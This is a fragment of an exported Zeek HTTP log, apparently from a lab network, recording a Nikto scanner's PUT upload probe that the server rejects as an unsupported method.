like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169","-","-",FXCUNM1wRUQAaZhxm4,"text/html","File not found",1,CSDzA82QyMD2HUGj6f
"Mar 7, 2025 @ 18:08:23.474",DzXecpUB2C2rFDMeCH2E,"-",".ds-logs-zeek.http-default-2025.02.09-000001","-","31bb5b0b-eb42-43cf-a262-2b99efeec113","7bbe62c4-954d-4ef6-8153-d88e64035539",Zeek,Zeek,filebeat,"8.17.1","zeek.http",default,logs,"192.168.56.102","192.168.56.102","8,000","8.17.0","7bbe62c4-954d-4ef6-8153-d88e64035539",false,"8.17.1",PUT,verified,"network, web","Mar 7, 2025 @ 18:08:25.847","zeek.http",CuxN8w2WRudZY47pVc,"Mar 7, 2025 @ 18:08:28.000",event,zeek,failure,"connection, protocol, info",22,PUT,356,501,"1.0",log,"/opt/zeek/logs/current/http.log","178,019","1:wZfpIr7wKzs09oCryHclkajs+D8=",tcp,"192.168.56.108, 192.168.56.102","192.168.56.108","192.168.56.108","54,122","forwarded, zeek-http","192.168.56.102",html,"/nikto-test-PnyuQ9xv.html","/nikto-test-PnyuQ9xv.html","/nikto-test-PnyuQ9xv.html","-",Other,Chrome,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36","Windows 10","Windows 10",Windows,Windows,10,"74.0.3729.169",FPuC0E5BZAvuOpjRb,"text/plain",FHvdsUUoD3ioqyfvg,"text/html","Unsupported method ('PUT')",1,CuxN8w2WRudZY47pVc
